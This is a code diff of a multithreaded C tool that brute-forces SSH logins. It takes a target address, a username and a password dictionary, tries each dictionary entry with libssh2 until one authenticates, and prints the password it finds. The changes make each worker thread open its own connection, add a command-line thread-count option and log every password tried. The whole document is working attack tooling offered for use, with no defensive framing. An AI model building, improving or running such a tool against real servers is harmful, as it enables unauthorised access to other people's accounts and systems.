@@ -3,11 +3,13 @@
 #include "lines.h"
 #include "ssh.h"
 #include "memory.h"
+#include <stdint.h>
+#include <limits.h>
 #include <unistd.h>
 #include <pthread.h>
 
 typedef struct bruteforce_data_t {
-	int             ssh_socket;
+	const char*     address;
 	const char*     username;
 	FILE*           dict_file;
 	pthread_mutex_t dict_mutex;
@@ -31,19 +33,31 @@ void disconnect_ssh (void* _session)
 	libssh2_session_disconnect (session, "Disconnect by application");
 }
 
+void close_socket (void* _socket)
+{
+	int socket = *(int*)_socket;
+	close (socket);
+}
+
 status_t bruteforce_core (line_t (*the_password), void* _data)
 {
 	bruteforce_data_t* data = _data;
 	status_t status = success ();
 
+	int ssh_socket;
+	status = connect_tcp (&ssh_socket, data->address, "22");
+	if (failed (status))
+		goto end;
+	pthread_cleanup_push (&close_socket, &ssh_socket);
+
 	LIBSSH2_SESSION* session = libssh2_session_init ();
 	if (session == NULL) {
 		status = failure ("Failed to initialize an SSH session");
-		goto end;
+		goto close;
 	}
 	pthread_cleanup_push (&free_ssh, session);
 
-	if (libssh2_session_startup (session, data->ssh_socket) != 0) {
+	if (libssh2_session_startup (session, ssh_socket) != 0) {
 		status = sshfailure (session);
 		goto free;
 	}
@@ -77,6 +91,7 @@ status_t bruteforce_core (line_t (*the_password), void* _data)
 			goto disconnect;
 
 		const char* password = line.ntbs;
+		printf ("Trying \"%s\"\n", password);
 		if (libssh2_userauth_password (session, data->username, password) >= 0) {
 			(*the_password) = line;
 			goto disconnect;
@@ -86,6 +101,8 @@ status_t bruteforce_core (line_t (*the_password), void* _data)
 disconnect:
 	pthread_cleanup_pop (1);
 free:
+	pthread_cleanup_pop (1);
+close:
 	pthread_cleanup_pop (1);
 end:
 	return status;
@@ -125,13 +142,15 @@ void* bruteforce_thread (void* _data)
 	return NULL;
 }
 
-status_t bruteforce (line_t (*password), int ssh_socket, const char* username, FILE* dict_file, int nthreads)
+#include <gcrypt.h>
+GCRY_THREAD_OPTION_PTHREAD_IMPL;
+
+status_t bruteforce (line_t (*password), const char* address, const char* username, FILE* dict_file, int nthreads)
 {
-	// FIXME
-	nthreads = 1;
+	gcry_control (GCRYCTL_SET_THREAD_CBS, &gcry_threads_pthread);
 
 	bruteforce_data_t data = {
-		.ssh_socket     = ssh_socket,
+		.address        = address,
 		.username       = username,
 		.dict_file      = dict_file,
 		.dict_mutex     = PTHREAD_MUTEX_INITIALIZER,
@@ -189,17 +208,40 @@ status_t bruteforce (line_t (*password), int ssh_socket, const char* username, F
 
 
 
+status_t parse_uint64_t (uint64_t (*value),
+                         const char* string)
+{
+	const char* endptr = string;
+	uint64_t _value = strtoull (string, (char**)&endptr, 10);
+	if ((*string == '\0' || *endptr != '\0'))
+		return failure ("Invalid value");
+
+	(*value) = _value;
+	return success ();
+}
+
 status_t get_args (const char* (*address),
                    const char* (*username),
                    const char* (*dict_filename),
+                   int (*nthreads),
                    int argc, const char* const* argv)
 {
-	if (argc != 4)
+	if (argc != 4 && argc != 5)
 		return failure (NULL);
 
 	(*address) = argv [1];
 	(*username) = argv [2];
 	(*dict_filename) = argv [3];
+	if (argc == 5) {
+		uint64_t u64_nthreads;
+		status_t status = parse_uint64_t (&u64_nthreads, argv [4]);
+		if (failed (status))
+			return status;
+		if (u64_nthreads > INT_MAX)
+			return failure ("Value out of range");
+		(*nthreads) = u64_nthreads;
+	}
+
 	return success ();
 }
 
@@ -208,23 +250,19 @@ int main (int argc, const char* const* argv)
 	const char* address = NULL;
 	const char* username = NULL;
 	const char* dict_filename = NULL;
-	check (get_args (&address, &username, &dict_filename, argc, argv),
-	       "Usage: sshpass address username dict_file");
-
-	int ssh_socket = -1;
-	check (connect_tcp (&ssh_socket, address, "22"),
-	       "Could not connect to %s:%s", address, "22");
+	int nthreads = 1;
+	check (get_args (&address, &username, &dict_filename, &nthreads, argc, argv),
+	       "Usage: sshpass address username dict_file [threads=1]");
 
 	FILE* dict_file = fopen (dict_filename, "r");
 	raw_check (dict_file != NULL, "Could not open %s for reading", dict_filename);
 
 	line_t password;
-	check (bruteforce (&password, ssh_socket, username, dict_file, 2),
+	check (bruteforce (&password, address, username, dict_file, nthreads),
 	       "Could not bruteforce ssh:%s@%s", username, address);
 
 	printf ("Password: %s\n", password.ntbs);
 
-	close (ssh_socket);
 	fclose (dict_file);
 	return EXIT_SUCCESS;
 }
